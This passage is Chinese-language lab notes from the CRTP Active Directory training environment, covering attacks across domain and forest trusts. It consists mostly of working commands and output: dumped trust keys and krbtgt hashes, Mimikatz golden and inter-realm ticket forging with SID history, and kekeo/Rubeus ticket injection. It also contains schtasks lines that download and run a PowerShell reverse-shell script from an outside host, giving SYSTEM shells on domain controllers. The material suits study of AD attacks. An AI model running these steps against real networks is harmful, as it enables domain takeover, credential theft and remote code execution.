    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
```

与子域的信任信息
```
Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 2/22/2022 1:47:50 AM - CLEAR   - 98 92 74 31 9d 75 ef 06 71 30 f4 23 88 78 d0 8c 63 e6 a1 c4 d3 1d ea c0 81 ea f4 f8
        * aes256_hmac       bcd2a265b3f6626193662328115b78823de5ef3e5d11bcefac08f311e6cfca24
        * aes128_hmac       ac4ab1dc6a1477d36ee37aea2ad48396
        * rc4_hmac_nt       925c2b6bf5771525b47a4a20d624b463
```

与另外一个森林里的eurocorp.local的信任关系
```
Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
```

用powerview可以更加清晰的看到这些关系
```
PS C:\ad> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```

## 子域到父域（CIFS，访问文件系统）

获取父域的计算机列表
```
PS C:\ad\kekeo_old> Get-NetComputer -Domain moneycorp.local
mcorp-dc.moneycorp.local
dcorp-stdadmin.moneycorp.local
```

很明显，mcorp-dc就是父域里的DC服务器

伪造一条到父域```moneycorp.local```的TGT

从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值

不能使用Administrator的用户NTML

伪造TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\child2parent_trust_tkt.kirbi"'
```

在```C:\AD\kekeo_old```下现在应该可以看到一个child2parent_trust_tkt.kirbi文件

### 方法一 （kekeo）

制作一张可以访问父域moneycorp.local的TGS

```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\child2parent_trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Ticket    : C:\AD\kekeo_old\child2parent_trust_tkt.kirbi
Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
Principal : Administrator @ dollarcorp.moneycorp.local

> CIFS/mcorp-dc.moneycorp.local
  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
```

此时在```C:\AD\kekeo_old```下已经生成一个CIFS.mcorp-dc.moneycorp.local.kirbi的TGS文件


将 TGS 呈现给目标服务
```
PS C:\ad\kekeo_old>  .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi

  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

现在可以访问到父域DC
```
PS C:\ad\kekeo_old> ls //mcorp-dc.moneycorp.local/c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   4:33 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---        2/16/2019   9:14 PM                Users
d-----        8/20/2020   2:57 AM                Windows
```


## 子域到父域（以用户身份访问，可以执行shell）

krbtgt的NTML信息
```
krbtgt:ff46a9d8bd66c6efd77603da26796f35
```

生成一个用户访问TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'
```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
```

使用下面两个命令之一验证上面操作是否成功
```
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```
或者
```
ls \\mcorp-dc.moneycorp.local\c$
```

利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S mcorp-dc.moneycorp.local /TN "User366"
```

收到反弹shell
```
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
mcorp-dc
PS C:\Windows\system32>
```


## 父域到子域

枚举子域的计算机
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-NetComputer -Domain us.dollarcorp.moneycorp.local
us-dc.us.dollarcorp.moneycorp.local
```

枚举子域DC上的分享文件盘
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-ShareFinder -ComputerName us-dc.us.dollarcorp.moneycorp.local
\\us-dc.us.dollarcorp.moneycorp.local\ADMIN$    - Remote Admin
\\us-dc.us.dollarcorp.moneycorp.local\C$        - Default share
\\us-dc.us.dollarcorp.moneycorp.local\IPC$      - Remote IPC
\\us-dc.us.dollarcorp.moneycorp.local\NETLOGON  - Logon server share
\\us-dc.us.dollarcorp.moneycorp.local\SYSVOL    - Logon server share
```


与子域的信任信息
```
Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
    * 2/22/2022 1:47:50 AM - CLEAR   - 98 92 74 31 9d 75 ef 06 71 30 f4 23 88 78 d0 8c 63 e6 a1 c4 d3 1d ea c0 81 ea f4 f8
        * aes256_hmac       bcd2a265b3f6626193662328115b78823de5ef3e5d11bcefac08f311e6cfca24
        * aes128_hmac       ac4ab1dc6a1477d36ee37aea2ad48396
        * rc4_hmac_nt       925c2b6bf5771525b47a4a20d624b463
```

krbtgt的NTML信息
```
krbtgt:ff46a9d8bd66c6efd77603da26796f35
```

生成一个用户访问TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-3146393536-1393405867-2905981701-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_p2c_tkt.kirbi"'
```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_p2c_tkt.kirbi"'
```

使用下面两个命令之一验证上面操作是否成功

```
ls \\us-dc.us.dollarcorp.moneycorp.local\c$
```

会报错。

跟助教沟通，CRTP的这个lab环境不允许访问子域的DC。但是上面的方法应该是没错的。

```
C:\Windows\system32>nmap -sV -Pn 172.16.9.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 23:28 Pacific Standard Time
Nmap scan report for 172.16.9.1
Host is up (0.0018s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-23 07:28:42Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: moneycorp.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: us)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: moneycorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: US-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.82 seconds
```




# 跨林访问

开启一个DA的shell

伪造一条到EUROCORP.LOCAL的TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
```


制作一张可以访问EUROCORP.LOCAL的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

查看目标计算机里的SharedwithDCorp文件夹
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

## 方法二（rebuse.exe）


同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

访问对方林中的计算机
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```




生成一个用户访问TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-1652071801-1423090587-98612180-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_forest_tkt.kirbi"'
```

 C:\AD\krbtgt_forest_tkt.kirbi


 Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_forest_tkt.kirbi"'



利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S eurocorp-dc.eurocorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S eurocorp-dc.eurocorp.local /TN "User366"
```
